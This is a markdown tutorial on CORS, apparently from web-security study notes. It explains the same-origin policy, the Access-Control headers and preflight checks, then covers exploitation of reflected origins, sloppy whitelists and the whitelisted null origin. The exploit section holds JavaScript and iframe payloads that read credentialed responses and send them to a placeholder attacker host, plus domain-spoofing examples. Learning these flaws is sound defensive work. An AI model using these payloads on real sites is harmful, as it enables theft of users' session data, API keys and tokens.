# CORS (Cross-origin resource sharing)

CORS (Cross-Origin Resource Sharing) is a security feature implemented by web browsers that controls how web pages in one domain can request and interact with resources from another domain.

### Table of content 

- **Explanation**
- [Same-origin policy (SOP)](#same-origin-policy-sop)
- [Access-Control-Allow-Origin](#access-control-allow-origin)
    - [Handling cross-origin resource requests with credentials](#handling-cross-origin-resource-requests-with-credentials)
    - [Pre-flight checks](#pre-flight-checks)
- **Exploit**
- [Sever-generated ACAO header from client-specified Origin header](#sever-generated-acao-header-from-client-specified-origin-header)
- [Errors parsing Origin headers](#errors-parsing-origin-headers)
- [Whitelisted null origin value](#whitelisted-null-origin-value)

## Same-origin policy (SOP)

The same-origin policy restricts scripts on one origin from accessing data from another origin. An origin consists of a URI scheme, domain and port number.

[-> Site vs Origin explane](/web/client-side/csrf.md#site-vs-origin)

```c
http://normal-website.com/example/example.html:8080
|  |   |                |                      |   |
----    ----------------                       ----
|      |                                       |_ '8080' = port
|      |
|      |_ 'normal-website.com' = domain
|
|_ 'http' = scheme
```

To be consider as the same origin it must have the same scheme, domain and port.

## Access-Control-Allow-Origin 

The same-origin policy is very restrictive and consequently various approaches have been devised to circumvent the constraints.

The Access-Control-Allow-Origin header is included in the response from one website to a request originating from another website, and identifies the permitted origin of the request. A web browser compares the Access-Control-Allow-Origin with the requesting website's origin and permits access to the response if they match.

my-website.com -> *send a request to* -> another-website.com

:warning: It is another origin ! but if another-website.com include `Access-Control-Allow-Origin: https://my-website.com`, another-website.com allow me to access ressources from is webpage.

Access-Control-Allow-Origin control who can get access to your ressources.

### Handling cross-origin resource requests with credentials

The default behavior of cross-origin resource requests is for requests to be passed without credentials like cookies and the Authorization header. However, the cross-domain server can permit reading of the response when credentials are passed to it by setting the CORS Access-Control-Allow-Credentials header to true.

Request:

```
GET /data HTTP/1.1
Host: robust-website.com
...
Origin: https://normal-website.com
Cookie: JSESSIONID=<value>
```

Answer:

```
HTTP/1.1 200 OK
...
Access-Control-Allow-Origin: https://normal-website.com
Access-Control-Allow-Credentials: true
```

### Pre-flight checks

The pre-flight check is a request send by the client to the server to see if the method and potentially others header are allowed:

Request:

```
OPTIONS /data HTTP/1.1
Host: <some website>
...
Origin: https://normal-website.com
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: Special-Request-Header
```

Response:

```
HTTP/1.1 204 No Content
...
Access-Control-Allow-Origin: https://normal-website.com
Access-Control-Allow-Methods: PUT, POST, OPTIONS
Access-Control-Allow-Headers: Special-Request-Header
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 240
```

--- 

## Exploit

## Sever-generated ACAO header from client-specified Origin header

Some applications need to provide access to a number of other domains. To maintain it, they read the Origin header from requests and including a response header stating that the requesting origin is allowed.

Request:

```
GET /sensitive-victim-data HTTP/1.1
Host: vulnerable-website.com
Origin: https://malicious-website.com
Cookie: sessionid=...
```

Answer:

```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://malicious-website.com
Access-Control-Allow-Credentials: true
...
```

Because the application reflects arbitrary origins in the Access-Control-Allow-Origin header, this means that absolutely any domain can access resources from the vulnerable domain. If the response contains any sensitive information such as an API key or CSRF token, you could retrieve this by placing the following script on your website:

**payload**:

```js
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();

function reqListener() {
   location='//malicious-website.com/log?key='+this.responseText;
};
```

OR

```js
fetch('https://vulnerable-website.com/sensitive-victim-data', { credentials: 'include' })
    .then(response => response.text())
    .then(data => {
        location = '//malicious-website.com/log?key=' + data;
    })
    .catch(error => console.error('Erreur : ' + error));
```

## Errors parsing Origin headers
 
Some applications that support access from multiple origins do so by using a whitelist of allowed origins. When a CORS request is received, the supplied origin is compared to the whitelist. If the origin appears on the whitelist then it is reflected in the Access-Control-Allow-Origin header so that access is granted.

Mistakes often arise when implementing CORS origin whitelists. Some organizations decide to allow access from all their subdomains (including future subdomains not yet in existence). And some applications allow access from various other organizations' domains including their subdomains. These rules are often implemented by matching URL prefixes or suffixes, or using regular expressions.

For example, suppose an application grants access to all domains ending in:

```
normal-website.com
```

An attacker might be able to gain access by registering the domain:

```
hackersnormal-website.com
```

Alternatively, suppose an application grants access to all domains beginning with

```
normal-website.com
```

An attacker might be able to gain access using the domain:

```
normal-website.com.evil-user.net
```

## Whitelisted null origin value

The specification for the Origin header supports the value null. Browsers might send the value null in the Origin header in various unusual situations:

- Cross-origin redirects.
- Requests from serialized data.
- Request using the file: protocol.
- Sandboxed cross-origin requests.

Sandbox Payload:

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();

function reqListener() {
location='malicious-website.com/log?key='+this.responseText;
};
</script>"></iframe>
```

OR

```js
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
fetch('https://vulnerable-website.com/sensitive-victim-data', { credentials: 'include' })
    .then(response => response.text())
    .then(data => {
        location = '//malicious-website.com/log?key=' + data;
    })
    .catch(error => console.error('Erreur : ' + error));
</script>"></iframe>

```

---

[**:arrow_right_hook: Back home**](/README.md)